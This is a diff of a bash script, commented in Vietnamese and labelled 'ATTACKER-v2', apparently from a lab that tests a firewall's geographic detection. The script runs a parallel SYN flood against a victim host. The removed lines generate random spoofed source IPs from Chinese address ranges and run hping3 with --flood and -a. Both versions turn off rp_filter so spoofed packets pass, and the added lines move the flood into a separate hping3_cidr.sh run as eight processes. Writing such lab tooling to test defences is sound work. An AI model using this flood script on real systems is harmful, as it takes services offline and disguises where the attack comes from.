@@ -21,57 +21,28 @@
 VICTIM_IP="10.10.2.2"
 PORT=80
 
-# Các dải CIDR thực của Trung Quốc (đã verify trong GeoLite2 DB)
-# Cần đủ nhiều dải để random ra nhiều IP CN khác nhau → GeoHeuristic đếm
-CN_CIDRS=(
-    "1.1.16.0/20"
-    "1.118.48.0/20"
-    "1.2.0.0/23"
-    "1.24.0.0/13"
-    "14.0.4.0/22"
-    "14.17.0.0/16"
-    "27.0.4.0/22"
-    "36.0.0.0/11"
-)
-
-# Số tiến trình song song (mỗi tiến trình dùng 1 IP CN random khác nhau)
+# Số tiến trình song song
 NUM_PROCS=8
 
-echo "[*] [ATTACKER-v2] Đang chuẩn bị Botnet (Random IP trong CIDR CN)..."
+echo "[*] [ATTACKER-v2] Đang chuẩn bị Botnet (gọi hping3_cidr.sh)..."
 echo "    Số tiến trình: $NUM_PROCS | Target: $VICTIM_IP:$PORT"
 
 # Dọn dẹp hping3 cũ
 pkill hping3 2>/dev/null || true
+pkill -f hping3_cidr.sh 2>/dev/null || true
 rm -f /tmp/sc1_botnet_v2.pids
 
 # Tắt rp_filter để kernel chấp nhận packet với spoofed source IP
 sysctl -w net.ipv4.conf.all.rp_filter=0 > /dev/null 2>&1 || true
 sysctl -w net.ipv4.conf.default.rp_filter=0 > /dev/null 2>&1 || true
 
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
+
 for i in $(seq 1 $NUM_PROCS); do
-    # Chọn CIDR ngẫu nhiên từ danh sách CN
-    CIDR=${CN_CIDRS[$((RANDOM % ${#CN_CIDRS[@]}))]}
+    echo "    [+] Proc $i: Đang gọi hping3_cidr.sh..."
 
-    # Tạo IP ngẫu nhiên hợp lệ trong dải CIDR đó
-    SPOOF_IP=$(python3 -c "
-import ipaddress, random
-net = ipaddress.ip_network('$CIDR', strict=False)
-hosts = list(net.hosts())
-print(random.choice(hosts))
-" 2>/dev/null)
-
-    if [ -z "$SPOOF_IP" ]; then
-        echo "    [!] Không tạo được IP cho CIDR $CIDR, bỏ qua."
-        continue
-    fi
-
-    echo "    [+] Proc $i: Giả mạo IP $SPOOF_IP (từ $CIDR)"
-
-    # Chạy hping3 flood với IP giả mạo — giống hping3_cidr.sh đã test thành công
-    # --flood: bắn nhanh nhất có thể (không delay)
-    # -S: SYN packet, -p 80: port 80
-    # Chạy trong ns6 (có route tới victim qua firewall)
-    ip netns exec ns6 hping3 -S "$VICTIM_IP" -p "$PORT" --flood -a "$SPOOF_IP" --quiet > /dev/null 2>&1 &
+    # Chạy script hping3_cidr.sh trong ns6
+    ip netns exec ns6 bash "$SCRIPT_DIR/hping3_cidr.sh" > /dev/null 2>&1 &
 
     echo $! >> /tmp/sc1_botnet_v2.pids
     # Delay nhỏ giữa các tiến trình để tránh quá tải CPU attacker ngay lập tức
